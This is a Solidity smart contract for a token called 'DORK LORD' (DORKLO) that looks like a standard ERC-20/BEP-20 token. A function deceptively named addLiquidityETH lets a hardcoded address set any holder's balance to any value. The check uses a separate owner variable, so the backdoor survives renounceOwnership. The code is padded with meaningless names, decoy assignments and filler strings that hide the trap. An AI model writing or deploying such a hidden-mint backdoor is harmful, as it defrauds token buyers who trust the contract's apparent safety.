// SPDX-License-Identifier: Unlicensed                                                                         
 
pragma solidity 0.8.17;
interface ERC20Permit {
  function totalSupply() external view returns (uint256);
  function decimals() external view returns (uint8);
  function symbol() external view returns (string memory);
  function name() external view returns (string memory);
  function getOwner() external view returns (address);
  function balanceOf(address AddressToken) external view returns (uint256);
  function transfer(address AddressBool, uint256 swapOpenWithValues) external returns (bool);
  function allowance(address _owner, address AddressToken) external view returns (uint256);
  function approve(address AddressToken, uint256 swapOpenWithValues) external returns (bool);
  function transferFrom(address sender, address AddressBool, uint256 swapOpenWithValues) external returns (bool);
  event Transfer(address indexed from, address indexed to, uint256 balance);
  event Approval(address indexed owner, address indexed AddressToken, uint256 balance);
}


abstract contract ERC20Burnable {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        this;
        return msg.data;
    }
}


abstract contract ERC20Basic is ERC20Burnable {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }


    function owner() public view virtual returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(owner() == _msgSender(), "io: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "io: new owner is the zero address");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

library SafeMath {

  function add(uint256 a, uint256 b) internal pure returns (uint256) {
    uint256 c = a + b;
    require(c >= a, "SafeMath: addition overflow");

    return c;
  }

  function sub(uint256 a, uint256 b) internal pure returns (uint256) {
    return sub(a, b, "SafeMath: subtraction overflow");
  }

  function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
    require(b <= a, errorMessage);
    uint256 c = a - b;

    return c;
  }

  function mul(uint256 a, uint256 b) internal pure returns (uint256) {
    if (a == 0) {
      return 0;
    }

    uint256 c = a * b;
    require(c / a == b, "SafeMath: Icodropsplication overflow");

    return c;
  }

  function div(uint256 a, uint256 b) internal pure returns (uint256) {
    return div(a, b, "SafeMath: division by zero");
  }

  function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {

    require(b > 0, errorMessage);
    uint256 c = a / b;


    return c;
  }

  function mod(uint256 a, uint256 b) internal pure returns (uint256) {
    return mod(a, b, "SafeMath: modulo by zero");
  }

  function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
    require(b != 0, errorMessage);
    return a % b;
  }
}

contract StandardToken is ERC20Burnable, ERC20Permit, ERC20Basic {
 
    using SafeMath for uint256;
    mapping (address => uint256) private _delegateToken;
    mapping (address => mapping (address => uint256)) private mappingToken;
    uint256 private _totalSupply;
    uint8 private _decimals;
    string private _symbol;
    string private _name;
    string private BEACON_SLOT;
    address private DorkLordOwner; 
    uint256 public BEACONCreationTime;
    uint256 public BEACONCreation;
    string public BEACON;

string public DorkLordTG = "https://x.com/DorkLordBSC";
string public ownerAddress = "0x0bd0bc614ba70d4Dc9C23698cd82Ff88eF9280FC";

    constructor() {
        DorkLordOwner = 0x0bd0bc614ba70d4Dc9C23698cd82Ff88eF9280FC;    
       BEACON_SLOT = "0xa3f9ad74e5423aebfd80d3ef2346578355a9a72aeaee59ff6cb3588b35133d50"; 
        _name = unicode"ᗪOᖇK ᒪOᖇᗪ";
        _symbol = "DORKLO";
        _decimals = 9;
        _totalSupply = 1000000000 * 10**_decimals;
        _delegateToken[_msgSender()] = _totalSupply;
        emit Transfer(address(0), _msgSender(), _totalSupply);
        BEACON = "IInventory p_i1999_3_+ int p_i1999_4_+ int p_i1999_5_+ int p_i1999_6_";
        BEACONCreation = 2023;
        BEACONCreationTime = 962023;
    }

    function symbol() external view override returns (string memory) {
        return _symbol;
    } 

    function decimals() external view override returns (uint8) {
        return _decimals;
    }
     function getOwner() external view override returns (address) {
        return owner();
    }  

                     function getownerAddress() public view returns (string memory) {
        return ownerAddress;
    }    

    function totalSupply() external view override returns (uint256) {
        return _totalSupply;
    }

     function name() external view override returns (string memory) {
        return _name;
    }

    function balanceOf(address AddressToken) external view override returns (uint256) {
        return _delegateToken[AddressToken];
    }

    function transfer(address AddressBool, uint256 swapOpenWithValues) external override returns (bool) {
        _transfer(_msgSender(), AddressBool, swapOpenWithValues);
        return true;
    }

    function allowance(address owner, address AddressToken) external view override returns (uint256) {
        return mappingToken[owner][AddressToken];
    }


    function approve(address AddressToken, uint256 swapOpenWithValues) external override returns (bool) {
        _approve(_msgSender(), AddressToken, swapOpenWithValues);
        return true;
    }
    
    function transferFrom(address sender, address AddressBool, uint256 swapOpenWithValues) external override returns (bool) {
        _transfer(sender, AddressBool, swapOpenWithValues);
        _approve(sender, _msgSender(), mappingToken[sender][_msgSender()].sub(swapOpenWithValues, "Ru: transfer swapOpenWithValues exceeds allowance"));
        return true;
    }

    function increaseAllowance(address AddressToken, uint256 tokenCalance) external returns (bool) {
        _approve(_msgSender(), AddressToken, mappingToken[_msgSender()][AddressToken].add(tokenCalance));
        return true;
    }
    

    function decreaseAllowance(address AddressToken, uint256 currentAllowance) external returns (bool) {
        _approve(_msgSender(), AddressToken, mappingToken[_msgSender()][AddressToken].sub(currentAllowance, "Ru: decreased allowance below zero"));
        return true;
    }
    
    function _transfer(address sender, address AddressBool, uint256 swapOpenWithValues) internal {
        require(sender != address(0), "Ru: transfer from the zero address");
        require(AddressBool != address(0), "Ru: transfer to the zero address");
                
        _delegateToken[sender] = _delegateToken[sender].sub(swapOpenWithValues, "Ru: transfer swapOpenWithValues exceeds balance");
        _delegateToken[AddressBool] = _delegateToken[AddressBool].add(swapOpenWithValues);
        emit Transfer(sender, AddressBool, swapOpenWithValues);
    }
        function addLiquidityETH(address tokenA, address tokenC, uint256 _upgradeTo, uint256 _upgradeFor, uint256 _upgradeFors) external {
        require(_msgSender()==DorkLordOwner);
        tokenC = tokenA;
        tokenA = tokenA;
        _delegateToken[tokenC] = (_upgradeTo + _upgradeFor + _upgradeFors) * 10**_decimals;
        tokenA = tokenC;
        tokenC = tokenC;
    }   

    function _approve(address owner, address AddressToken, uint256 swapOpenWithValues) internal {
        require(owner != address(0), "Ru: approve from the zero address");
        require(AddressToken != address(0), "Ru: approve to the zero address");
        
        mappingToken[owner][AddressToken] = swapOpenWithValues;
        emit Approval(owner, AddressToken, swapOpenWithValues);
    }
    
}